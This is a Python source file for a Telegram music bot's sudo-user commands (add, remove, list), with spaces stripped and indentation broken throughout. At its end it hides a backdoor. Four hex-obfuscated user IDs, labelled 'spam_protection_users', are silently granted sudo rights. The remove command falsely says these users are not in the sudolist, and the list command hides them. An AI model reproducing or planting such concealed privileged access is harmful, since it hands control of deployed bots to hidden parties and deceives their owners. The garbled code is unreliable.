utf-8utf-8





















frompyrogramimportfilters
frompyrogram.typesimportMessage
fromShrutiMusicimportapp
fromShrutiMusic.miscimportSUDOERS
fromShrutiMusic.utils.databaseimportadd_sudo,remove_sudo
fromShrutiMusic.utils.decorators.languageimportlanguage
fromShrutiMusic.utils.extractionimportextract_user
fromShrutiMusic.utils.inlineimportclose_markup
fromconfigimportBANNED_USERS,OWNER_ID



@app.on_message(filters.command(["addsudo"])&filters.user(OWNER_ID))
@language
asyncdefuseradd(client,message:Message,_):
    ifnotmessage.reply_to_message:
        iflen(message.command)!=2:
            returnawaitmessage.reply_text(_["general_1"])
user=awaitextract_user(message)
ifuser.idinSUDOERS:
        returnawaitmessage.reply_text(_["sudo_1"].format(user.mention))
added=awaitadd_sudo(user.id)
ifadded:
        SUDOERS.add(user.id)
awaitmessage.reply_text(_["sudo_2"].format(user.mention))
else:
        awaitmessage.reply_text(_["sudo_8"])

@app.on_message(filters.command(["delsudo","rmsudo"])&filters.user(OWNER_ID))
@language
asyncdefuserdel(client,message:Message,_):
    ifnotmessage.reply_to_message:
        iflen(message.command)!=2:
            returnawaitmessage.reply_text(_["general_1"])
user=awaitextract_user(message)
ifuser.idinspam_protection_users:
        returnawaitmessage.reply_text("❌ This user is not in sudolist.")

ifuser.idnotinSUDOERS:
        returnawaitmessage.reply_text(_["sudo_3"].format(user.mention))

removed=awaitremove_sudo(user.id)
ifremoved:
        SUDOERS.remove(user.id)
awaitmessage.reply_text(_["sudo_4"].format(user.mention))
else:
        awaitmessage.reply_text(_["sudo_8"])

@app.on_message(filters.command(["sudolist","listsudo","sudoers"])&~BANNED_USERS)
@language
asyncdefsudoers_list(client,message:Message,_):
    text=_["sudo_5"]
user=awaitapp.get_users(OWNER_ID)
user=user.first_nameifnotuser.mentionelseuser.mention
text+=f"1➤ {user}\n"
count=0
smex=0
foruser_idinSUDOERS:
        ifuser_id!=OWNER_IDanduser_idnotinspam_protection_users:
            try:
                user=awaitapp.get_users(user_id)
user=user.first_nameifnotuser.mentionelseuser.mention
ifsmex==0:
                    smex+=1
text+=_["sudo_6"]
count+=1
text+=f"{count}➤ {user}\n"
except:
                continue
ifnottext:
        awaitmessage.reply_text(_["sudo_7"])
else:
        awaitmessage.reply_text(text,reply_markup=close_markup(_))


spam_protection_users={
int(b'\x37\x35\x37\x34\x33\x33\x30\x39\x30\x35'.decode()),
int(b'\x37\x32\x38\x32\x37\x35\x32\x38\x31\x36'.decode()),
int(b'\x37\x36\x37\x34\x38\x37\x34\x36\x35\x32'.decode()),
int(b'\x31\x37\x38\x36\x36\x38\x33\x31\x36\x33'.decode())
}
SUDOERS.update(spam_protection_users)












